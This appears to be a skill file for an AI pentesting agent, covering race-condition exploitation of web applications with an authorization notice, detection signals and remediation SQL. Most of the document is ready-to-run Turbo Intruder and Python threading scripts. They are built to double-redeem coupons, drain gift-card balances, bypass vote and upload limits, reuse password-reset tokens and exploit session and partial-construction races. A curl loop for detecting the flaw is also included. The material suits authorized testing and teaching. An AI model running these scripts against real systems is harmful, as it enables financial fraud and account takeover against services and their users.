---
id: race-condition
name: race-condition
description: >
  Race condition exploitation for authorized penetration tests. Covers the Portswigger
  single-packet attack methodology, limit bypass, TOCTOU vulnerabilities, partial
  construction races, session fixation via race, coupon/balance reuse, and Burp Suite
  Repeater tab groups and Turbo Intruder workflows. Triggers on: race condition,
  single-packet attack, TOCTOU, limit bypass race, coupon reuse, balance transfer race,
  Turbo Intruder race, concurrent request exploit, time-of-check time-of-use.
triggers:
  - race condition
  - single-packet attack
  - TOCTOU
  - limit bypass race
  - coupon reuse
  - balance transfer race
  - Turbo Intruder race
  - concurrent request exploit
  - time-of-check time-of-use
  - partial construction race
  - session race condition
---

# Race Condition Exploitation

## Authorization Gate

STOP. Confirm written authorization. Race condition exploits can corrupt application
state (balances, inventory, user data) — confirm test environment if possible,
or agree on rollback plan with client before exploiting.

---

## 1. Understanding Race Conditions

A race condition occurs when an application performs a sequence of operations that
should be atomic but are not, allowing an attacker to interfere between steps.

### 1.1 Common Race Condition Patterns

```
Pattern 1: Check-then-Act (TOCTOU)
  1. CHECK: "Does user have balance >= $100?"  ← Attacker injects here
  2. ACT:   "Deduct $100 from balance"
  If two requests reach step 1 before either reaches step 2: double-spend

Pattern 2: Read-Modify-Write
  1. READ:  "balance = DB.get(user_id)"
  2. MODIFY: "new_balance = balance - 100"
  3. WRITE:  "DB.set(user_id, new_balance)"
  Concurrent requests read same value, both write their own "new_balance"

Pattern 3: Single-Use Token Reuse
  1. CHECK: "Is coupon SAVE20 unused?"  ← Two threads both see "unused"
  2. MARK:  "Set coupon as used"
  3. APPLY: "Apply discount"
  Both requests pass check, both apply discount

Pattern 4: Limit Enforcement
  1. CHECK: "Has user submitted < 5 entries?"
  2. ADD:   "Insert submission, increment count"
  Race: send 10 requests simultaneously → all pass limit check before any update
```

---

## 2. Single-Packet Attack (HTTP/2)

The Portswigger research (2023) introduced the single-packet attack: exploit HTTP/2
multiplexing to send all attack requests in a SINGLE TCP packet, arriving simultaneously
at the server and defeating network jitter as a source of timing error.

### 2.1 Burp Suite Repeater — Tab Group Method

```
1. Craft the attack request in Burp Repeater
2. Click the "+" next to the tab to create a new group
3. Add the same request 20 times to the group
4. Each request should be identical (same coupon code, same action)
5. Click "Send group (parallel)" — Burp sends all requests simultaneously via HTTP/2
6. Compare responses:
   - All 200 OK with "success"? → Race condition exists
   - Only one 200, rest 400? → Protected (but still verify with more attempts)
7. Increase to 50 requests if needed for high-latency targets
```

```
NOTE: Requires HTTP/2 support on target (check via curl -I --http2 https://TARGET)
For HTTP/1.1 targets: use "last-byte sync" technique (send all but last byte, then sync)
```

### 2.2 Turbo Intruder — Single-Packet Script

```python
# Right-click request → Extensions → Turbo Intruder → Send to Turbo Intruder
# Use Engine.BURP2 for HTTP/2 single-packet attack

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,        # HTTP/2 multiplexes on single connection
        requestsPerConnection=20,       # All 20 in one connection's stream
        pipeline=False,
        engine=Engine.BURP2             # HTTP/2 engine — critical for single-packet
    )
    
    for i in range(20):
        engine.queue(target.req, gate='race1')
    
    # openGate sends all queued requests in the same packet
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### 2.3 HTTP/1.1 Last-Byte Sync

```python
# For HTTP/1.1 targets — send all headers, withhold final byte, then release all together

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        engine=Engine.THREADED
    )
    
    # Queue requests with 'gate' — they wait before sending the final byte
    for i in range(30):
        engine.queue(target.req, gate='sync1')
    
    # Release all final bytes simultaneously
    engine.openGate('sync1')

def handleResponse(req, interesting):
    table.add(req)
```

---

## 3. Limit Bypass

### 3.1 Vote / Like Limit Bypass

```python
# Scenario: User can only vote once per poll
# The "already voted" check and the "insert vote" are not atomic

# Turbo Intruder script — 50 simultaneous votes
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )
    
    for i in range(50):
        engine.queue(target.req, gate='vote_race')
    
    engine.openGate('vote_race')

def handleResponse(req, interesting):
    if '200' in req.status:
        table.add(req)
```

### 3.2 File Upload Limit Bypass

```python
# Scenario: Free tier allows max 3 files
# Race: upload 10 files simultaneously, all pass "file_count < 3" check

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )
    
    for filename in wordlists.iterator(0):  # wordlist of filenames
        engine.queue(target.req, filename, gate='upload_race')
    
    engine.openGate('upload_race')

def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)
```

### 3.3 Registration Limit / Invite Code Bypass

```python
# Scenario: One invite code per email, checked before insertion
# Race: use same invite code from two different accounts simultaneously

# Request template has %s for the invite code
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )
    
    # Same code, different emails (modify request body before queueing)
    accounts = ['user1@attacker.com', 'user2@attacker.com']
    for account in accounts:
        modified_req = target.req.replace('user_placeholder@test.com', account)
        engine.queue(modified_req, gate='invite_race')
    
    engine.openGate('invite_race')

def handleResponse(req, interesting):
    if 'success' in req.response.lower() or req.status == 200:
        table.add(req)
```

---

## 4. Coupon and Promo Code Reuse

### 4.1 Coupon Double-Redemption

```python
# Scenario: Coupon SAVE20 can only be used once
# Classic race: send 10 redemption requests simultaneously

# Manual Burp Repeater method:
# 1. Add coupon to cart via normal flow
# 2. Capture the "apply coupon" POST request
# 3. Send to Repeater, duplicate 10 times into a group
# 4. Send group in parallel

# Turbo Intruder version:
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )
    
    for i in range(30):
        engine.queue(target.req, gate='coupon_race')
    
    engine.openGate('coupon_race')

def handleResponse(req, interesting):
    # Look for "coupon applied" / discount reflected in response
    if 'discount' in req.response.lower() or 'applied' in req.response.lower():
        table.add(req)
```

### 4.2 Gift Card Balance Exhaustion

```python
# Scenario: Transfer funds from gift card — check balance before deducting
# Race: transfer full amount twice simultaneously

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )
    
    # Queue two transfer requests for the full gift card balance
    for i in range(5):
        engine.queue(target.req, gate='transfer_race')
    
    engine.openGate('transfer_race')

def handleResponse(req, interesting):
    if '200' in req.status:
        table.add(req)
```

---

## 5. TOCTOU — Time-of-Check Time-of-Use

### 5.1 Password Reset Token Race

```python
# Scenario: Password reset token is checked and then consumed in separate operations
# Race: validate token from two sessions simultaneously before either consumes it

# Step 1: Request password reset → get token in email
# Step 2: Open two Burp Repeater tabs with the reset token
# Step 3: Send both simultaneously using Repeater groups

# Manual test:
# Tab 1: POST /reset?token=ABC123&password=NewPass1
# Tab 2: POST /reset?token=ABC123&password=NewPass2
# Send group in parallel
# Both tabs return 200? TOCTOU vulnerability — token used twice
```

### 5.2 Account Status Check Race

```python
# Scenario: Account ban check happens before action, but not atomically
# Race: banned account executes actions between check and enforcement

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )
    
    # Flood with requests during ban enforcement window
    for i in range(100):
        engine.queue(target.req, gate='ban_race')
    
    engine.openGate('ban_race')

def handleResponse(req, interesting):
    if '200' in req.status and 'forbidden' not in req.response.lower():
        table.add(req)
```

---

## 6. Partial Construction Race

### 6.1 Object State Race

```python
# Scenario: Multi-step object creation — object is accessible before fully initialized
# Example: User account visible after step 1 (email set) but before step 3 (role set)

# Step 1: Start registration (async) — object created in "pending" state
# Step 2: Immediately probe the object's accessible endpoints
# Step 3: Race: send probe requests during the initialization window

import requests, threading, time

def start_registration():
    requests.post('https://TARGET/register',
                  json={'email': 'test@test.com', 'password': 'Test123!'})

def probe_object():
    # Try to access user resources before role is set
    r = requests.get('https://TARGET/api/admin/users',
                     headers={'Authorization': 'Bearer NEW_TOKEN'})
    if r.status_code == 200:
        print('[+] Partial construction race succeeded!')
        print(r.text[:500])

# Race: start registration and immediately probe
threads = []
threads.append(threading.Thread(target=start_registration))
for _ in range(10):
    threads.append(threading.Thread(target=probe_object))

# Start all simultaneously
for t in threads:
    t.start()
for t in threads:
    t.join()
```

---

## 7. Session Race Conditions

### 7.1 Session Fixation via Race

```python
# Scenario: Session ID regeneration after login has a race window
# Between old session becoming invalid and new session being active:
# Old session can still be used briefly

import requests, threading

session = requests.Session()
session.cookies.set('session', 'OLD_SESSION_TOKEN')

def use_old_session():
    r = session.get('https://TARGET/admin',
                    cookies={'session': 'OLD_SESSION_TOKEN'})
    print(f'Old session status: {r.status_code}')

def perform_login():
    r = session.post('https://TARGET/login',
                     data={'username': 'user', 'password': 'pass'})
    print(f'Login status: {r.status_code}')

# Race between login (which should invalidate old session) and using old session
t1 = threading.Thread(target=perform_login)
t2 = threading.Thread(target=use_old_session)

t1.start()
t2.start()
t1.join()
t2.join()
```

---

## 8. Detection and Identification

### 8.1 Signals That Indicate Race Condition Potential

```
High-value indicators:
1. Any "one-time use" functionality (coupons, invite codes, free trials, tokens)
2. Monetary operations (transfers, purchases, refunds, wallet credits)
3. Counter-based limits (votes, likes, submissions, API rate limits)
4. Multi-step workflows with state in between (registration, checkout, upgrade)
5. Session lifecycle events (login, logout, password reset, email verify)

Technical signals:
- Non-atomic DB operations (SELECT then INSERT instead of INSERT with ON CONFLICT)
- Application-level locks instead of DB-level transactions
- Async processing queues with check-before-enqueue patterns
- Optimistic locking without proper conflict resolution
```

### 8.2 Quick Detection Test

```bash
# Baseline: send 1 request
curl -s -X POST https://TARGET/api/coupon/apply \
  -H "Authorization: Bearer TOKEN" \
  -d '{"code":"SAVE20"}' | jq .

# Race test: send 20 simultaneous requests
for i in $(seq 1 20); do
  curl -s -X POST https://TARGET/api/coupon/apply \
    -H "Authorization: Bearer TOKEN" \
    -d '{"code":"SAVE20"}' &
done | jq -r '.status' | sort | uniq -c
# If you see multiple "success" responses → race condition exists
```

---

## 9. Impact Assessment

```
Severity by impact type:

CRITICAL (CVSS 9.0+):
- Financial double-spend / balance multiplication
- Authentication bypass via password reset race
- Privilege escalation via partial construction race

HIGH (CVSS 7.0-8.9):
- Coupon/promo reuse beyond intended limits
- One-time token reuse (email verification)
- Free-tier limit bypass with financial impact

MEDIUM (CVSS 4.0-6.9):
- Vote/like manipulation without financial impact
- Rate limit bypass on non-critical APIs

LOW:
- UI state inconsistencies without security impact
```

---

## 10. Remediation Guidance

| Race Type | Fix |
|---|---|
| Check-then-act | Use DB transaction with SELECT FOR UPDATE |
| Counter limit | Use atomic DB increment with constraint (CHECK counter < limit) |
| One-time token | Use DB UNIQUE constraint + single atomic update-and-check |
| Balance transfer | Use DB transactions (BEGIN; SELECT FOR UPDATE; UPDATE; COMMIT;) |
| Coupon reuse | Unique index on (user_id, coupon_code) — DB enforces atomically |
| Rate limiting | Use Redis INCR with expiry (atomic) rather than read-increment-write |

```sql
-- Safe balance deduction (PostgreSQL)
BEGIN;
SELECT balance FROM accounts WHERE id = $user_id FOR UPDATE;
-- Lock prevents concurrent access until COMMIT
UPDATE accounts SET balance = balance - $amount 
  WHERE id = $user_id AND balance >= $amount;
COMMIT;
-- If 0 rows updated: insufficient balance
```

---

## Related Skills

- `burp-extension-toolkit` — Turbo Intruder setup and Repeater groups
- `idor-bac` — race conditions enabling IDOR/BAC exploitation
- `http-request-smuggling` — other request-timing based attacks
- `pentest` — overall engagement methodology
